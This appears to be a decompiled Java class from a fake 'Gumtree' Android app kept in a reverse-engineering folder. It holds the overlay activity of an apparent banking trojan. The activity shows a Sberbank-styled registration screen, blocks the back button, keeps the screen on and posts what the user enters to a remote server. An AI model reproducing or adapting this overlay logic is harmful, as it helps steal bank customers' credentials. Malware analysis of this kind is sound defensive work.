package com.gumsis.injs.s;

import android.os.Bundle;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.base.BaseActivity;
import com.gumsis.checktls.ScrTls;
import com.gumsis.ds.SValDialogs;
import com.gumsis.injs.api.request.SCRequest;
import com.gumsis.injs.api.response.SCResponse;
import com.gumsis.injs.s.model.SModel;
import com.gumsis.injs.s.views.SberRegisterView;
import com.gumsis.injs.s.views.SberRegisterView.OnSberRegisterCallback;

public class SRegActivity
  extends BaseActivity
{
  private void sendPostRequest(SModel paramSModel, final boolean paramBoolean)
  {
    paramSModel = new SCRequest(this, paramSModel, new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, SCResponse paramAnonymousSCResponse)
      {
        if (!paramBoolean)
        {
          try
          {
            if (paramAnonymousSCResponse.ret == 0)
            {
              if (paramAnonymousSCResponse.answer != null)
              {
                if (!paramAnonymousSCResponse.answer.equalsIgnoreCase("accepted")) {
                  return;
                }
                Realtalk.setDisS(SRegActivity.this, true);
                SRegActivity.this.finishActivity();
                return;
              }
              SRegActivity.this.finishActivity();
              return;
            }
          }
          catch (Exception paramAnonymousSCResponse)
          {
            SRegActivity.this.finishActivity();
            return;
          }
          SRegActivity.this.finishActivity();
        }
      }
    });
    HTTPServer.getInstance().doRequest(paramSModel);
  }
  
  public void onBackPressed() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    ScrTls.scrOn(this);
    paramBundle = new SberRegisterView(this);
    setContentView(paramBundle);
    paramBundle.setOnSberRegisterCallback(new SberRegisterView.OnSberRegisterCallback()
    {
      public void onBack()
      {
        SValDialogs.showDialog(SRegActivity.this, SRegActivity.this.getString(2131361827), SRegActivity.this.getString(2131361823));
      }
      
      public void onCancel()
      {
        SValDialogs.showDialog(SRegActivity.this, SRegActivity.this.getString(2131361827), SRegActivity.this.getString(2131361823));
      }
      
      public void onRegister(SModel paramAnonymousSModel, boolean paramAnonymousBoolean)
      {
        SRegActivity.this.sendPostRequest(paramAnonymousSModel, paramAnonymousBoolean);
      }
      
      public void onScan()
      {
        SValDialogs.showDialog(SRegActivity.this, SRegActivity.this.getString(2131361827), SRegActivity.this.getString(2131361821));
      }
    });
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    ScrTls.scrOff(this);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/injs/s/SRegActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */